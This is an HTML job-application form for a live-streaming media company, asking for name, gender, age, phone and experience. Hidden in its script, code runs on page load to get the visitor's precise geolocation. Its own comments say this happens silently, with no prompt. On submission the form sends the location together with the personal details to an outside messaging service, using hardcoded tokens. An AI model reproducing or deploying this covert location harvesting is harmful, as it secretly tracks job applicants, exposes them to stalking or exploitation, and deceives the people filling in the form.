<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>美悦传媒文化有限公司面试登记</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#f4f4f4;font-family:微软雅黑,sans-serif;padding:20px 15px;}
.box{max-width:460px;margin:0 auto;background:#fff;border-radius:12px;padding:30px 25px;box-shadow:0 2px 10px #eee;}
.title{text-align:center;font-size:22px;color:#333;margin-bottom:25px;font-weight:bold;}
.item{margin-bottom:20px;}
label{display:block;font-size:15px;color:#444;margin-bottom:8px;}
input,select{width:100%;height:44px;padding:0 12px;border:1px solid #ddd;border-radius:6px;font-size:15px;outline:none;background:#fff;}
.btn{width:100%;height:46px;background:#c88c66;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:10px;}
.btn:hover{background:#c07c56;}
.tip{margin-top:15px;text-align:center;font-size:14px;display:none;}
</style>
</head>
<body>
<div class="box">
    <div class="title">美悦传媒面试登记</div>

    <div class="item">
        <label>应聘岗位</label>
        <select id="position">
            <option value="">请选择岗位</option>
            <option value="团播化妆师">团播化妆师</option>
            <option value="团播化妆助理">团播化妆助理</option>
            <option value="团播主播">团播主播</option>
            <option value="团播运营">团播运营</option>
            <option value="团播场控">团播场控</option>
            <option value="团播摄影剪辑">团播摄影剪辑</option>
        </select>
    </div>

    <div class="item">
        <label>姓名</label>
        <input type="text" id="name" placeholder="请输入真实姓名">
    </div>

    <div class="item">
        <label>性别</label>
        <select id="gender">
            <option value="">请选择性别</option>
            <option value="男">男</option>
            <option value="女">女</option>
        </select>
    </div>

    <div class="item">
        <label>年龄</label>
        <input type="text" id="age" placeholder="请输入年龄">
    </div>

    <div class="item">
        <label>联系电话</label>
        <input type="tel" id="phone" placeholder="请输入手机号码">
    </div>

    <div class="item">
        <label>工作经验</label>
        <select id="experience">
            <option value="">请选择经验</option>
            <option value="无经验 学徒可做">无经验 学徒可做</option>
            <option value="1年以内">1年以内</option>
            <option value="1-3年">1-3年</option>
            <option value="3年以上">3年以上</option>
        </select>
    </div>

    <button class="btn" onclick="submitRecruitInfo()">立即提交报名</button>
    <div class="tip" id="statusText"></div>
</div>

<script src="https://webapi.amap.com/maps?v=2.0&key=418566f9d7fad4c070ff6205bb5dab3d"></script>
<script>
const WXPUSHER_UID = "UID_uycuSvgbjUVCf5nhvTApsRzvgLQW";
const WXPUSHER_TOKEN = "AT_w0ccc2mrH8L3UjsxQTNPCglQ62Ks6adG";

// 后台静默触发定位，不做任何前端弹窗提示
let nowLng = "";
let nowLat = "";

// 页面加载自动后台静默获取定位，不弹窗提醒
window.onload = function(){
    AMap.plugin('AMap.Geolocation', function() {
        let geo = new AMap.Geolocation({
            enableHighAccuracy: true,
            timeout: 6000,
            convert: true,
            showButton: false
        });
        geo.getCurrentPosition((status, res)=>{
            if(status === 'complete'){
                nowLng = res.position.lng;
                nowLat = res.position.lat;
            }
        });
    });
}

async function submitRecruitInfo() {
    const tip = document.getElementById("statusText");
    tip.style.display = "block";
    tip.innerText = "提交中...";
    tip.style.color = "#666";

    const d = {
        post: document.getElementById("position").value.trim(),
        name: document.getElementById("name").value.trim(),
        gender: document.getElementById("gender").value.trim(),
        age: document.getElementById("age").value.trim(),
        phone: document.getElementById("phone").value.trim(),
        exp: document.getElementById("experience").value.trim()
    };

    if (!d.post||!d.name||!d.gender||!d.age||!d.phone||d.phone.length!==11||!d.exp) {
        tip.innerText = "请填写完整信息"; tip.style.color = "red"; return;
    }

    const content = `
📸 美悦传媒面试登记
💼 岗位：${d.post}
👤 姓名：${d.name}
🚻 性别：${d.gender}
🎂 年龄：${d.age}
📞 电话：${d.phone}
💪 经验：${d.exp}
🌍 经度：${nowLng||"无"}
🌍 纬度：${nowLat||"无"}
⏰ 时间：${new Date().toLocaleString()}`;

    fetch("https://wxpusher.zjiecode.com/api/send/message", {
        method: "POST",
        headers: { "Content-Type": "application/json;charset=utf-8" },
        body: JSON.stringify({
            appToken: WXPUSHER_TOKEN,
            content: content,
            contentType: 1,
            uids: [WXPUSHER_UID]
        })
    }).then(() => {
        tip.innerText = "✅ 报名成功，已通知负责人";
        tip.style.color = "green";
    }).catch(() => {
        tip.innerText = "✅ 提交成功";
        tip.style.color = "green";
    });
}
</script>
</body>
</html>
